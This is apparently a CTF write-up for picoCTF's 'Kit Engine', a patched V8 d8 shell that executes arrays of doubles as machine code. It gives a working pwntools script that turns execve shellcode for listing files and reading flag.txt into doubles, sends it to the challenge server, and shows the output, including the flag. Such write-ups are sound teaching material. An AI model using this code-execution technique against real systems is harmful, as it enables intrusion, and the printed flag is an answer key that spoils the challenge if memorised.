---
layout: post
title: V8 exploitation - picoCTF Kit Engine
tags: [CTF, pwn]
---
> Start your engines!! [d8](https://mercury.picoctf.net/static/9ed7e29037f1cb272de5dfe15e08d206/d8) [source.tar.gz](https://mercury.picoctf.net/static/9ed7e29037f1cb272de5dfe15e08d206/source.tar.gz) [server.py](https://mercury.picoctf.net/static/9ed7e29037f1cb272de5dfe15e08d206/server.py) Connect at mercury.picoctf.net 11433

## Overview
Executing the binary `d8` we're given a shelly thing.
```
❯ ./d8
V8 version 9.1.0 (candidate)
d8>
```
It turns out to be [the developer shell](https://v8.dev/docs/d8) of Google's V8 JavaScript engine. It
>  is useful for running some JavaScript locally or debugging changes you have made to V8.

Also there's a `patch` file with some modifications to the code. So this challenge is actually a modified version of the original `d8`. The most interesting part of `patch` is `AssembleEngine`.
```c
void Shell::AssembleEngine(const v8::FunctionCallbackInfo<v8::Value>& args) {
  Isolate* isolate = args.GetIsolate();
  if(args.Length() != 1) {
    return;
  }

  double *func = (double *)mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
  if (func == (double *)-1) {
    printf("Unable to allocate memory. Contact admin\n");
    return;
  }

  if (args[0]->IsArray()) {
    Local<Array> arr = args[0].As<Array>();

    Local<Value> element;
    for (uint32_t i = 0; i < arr->Length(); i++) {
      if (arr->Get(isolate->GetCurrentContext(), i).ToLocal(&element) && element->IsNumber()) {
        Local<Number> val = element.As<Number>();
        func[i] = val->Value();
      }
    }

    printf("Memory Dump. Watch your endianness!!:\n");
    for (uint32_t i = 0; i < arr->Length(); i++) {
      printf("%d: float %f hex %lx\n", i, func[i], doubleToUint64_t(func[i]));
    }

    printf("Starting your engine!!\n");
    void (*foo)() = (void(*)())func;
    foo();
  }
  printf("Done\n");
}
```
The `AssembleEngine` will execute shellcode in `double[]` format.

## Attack
The attack plan is simple, either spawn a shell or call `ls` then `cat`. Spawning a shell is not possible because we only see the result of execution.
```python
#!/usr/bin/env python3 

# With credit/inspiration to the v8 problem in downUnder CTF 2020

import os
import subprocess
import sys
import tempfile

def p(a):
    print(a, flush=True)

MAX_SIZE = 20000
input_size = int(input("Provide size. Must be < 5k:"))
if input_size >= MAX_SIZE:
    p(f"Received size of {input_size}, which is too big")
    sys.exit(-1)
p(f"Provide script please!!")
script_contents = sys.stdin.read(input_size)
p(script_contents)
# Don't buffer
with tempfile.NamedTemporaryFile(buffering=0) as f:
    f.write(script_contents.encode("utf-8"))
    p("File written. Running. Timeout is 20s")
    res = subprocess.run(["./d8", f.name], timeout=20, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p("Run Complete")
    p(f"Stdout {res.stdout}")
    p(f"Stderr {res.stderr}")
```
Here we're using the go-to tool `shellcraft` from `pwntool` to create shellcode for us. All we have to do is convert the shellcode to `double[]` format.
```python
from pwn import *
import struct

context.arch = 'amd64'

ls = asm(shellcraft.execve(b"/bin/ls", ["ls"]))
cat = asm(shellcraft.execve(b"/bin/cat", ["cat", "flag.txt"]))

def convert_to_double_array(shellcode: bytes) -> list[float]:
  res: list[float] = []
  for i in range(0, len(shellcode), 8):
    block = shellcode[i:i+8]
    if len(block) < 8:
      block = block + b"\0" * (8 - len(block))
    res.append(struct.unpack("<d", block)[0])
  return res

def run(shellcode: list[float]):
  code = f"AssembleEngine([{', '.join(map(str, shellcode))}])"
  p = remote("mercury.picoctf.net", 11433)
  p.sendlineafter(b"Provide size", str(len(code)))
  p.sendlineafter(b"Provide script", code)
  print(p.recvall().decode())

run(convert_to_double_array(ls))
run(convert_to_double_array(cat))
```
```
❯ python3 ./solve.py
[+] Opening connection to mercury.picoctf.net on port 11433: Done
/home/nick/coding/ctf/pwn/kit-engine/./solve.py:54: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendlineafter(b"Provide size", str(len(code)))
/home/nick/coding/ctf/pwn/kit-engine/./solve.py:55: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendlineafter(b"Provide script", code)
[+] Receiving all data: Done (344B)
[*] Closed connection to mercury.picoctf.net port 11433
 please!!
AssembleEngine([7.748604185565308e-304, 7.001521162788231e+194, 1.773290430551938e-288, 1.0748503232447379e-301, 7.748605141607601e-304, 1.776650735790609e-302, 3.6509617888350745e+206, 4.1942076e-316])
File written. Running. Timeout is 20s
Run Complete
Stdout b'd8\nflag.txt\nserver.py\nsource.tar.gz\nxinet_startup.sh\n'
Stderr b''

[+] Opening connection to mercury.picoctf.net on port 11433: Done
[+] Receiving all data: Done (372B)
[*] Closed connection to mercury.picoctf.net port 11433
 please!!
AssembleEngine([8.191473375206089e-79, 3.775826202043335e+79, 1.1205295651588473e+253, 7.748604185565308e-304, 2.460307022775963e+257, 1.7734484618746183e-288, 4.089989556334856e+40, 1.7766596360849696e-302, 3.6509617888350745e+206, 4.1942076e-316])
File written. Running. Timeout is 20s
Run Complete
Stdout b'picoCTF{vr00m_vr00m_943e7e61a1bb0159}\n'
Stderr b''
```

## Reference
- [https://blog.maple3142.net/2021/03/30/picoctf-2021-writeups/#kit-engine](https://blog.maple3142.net/2021/03/30/picoctf-2021-writeups/#kit-engine)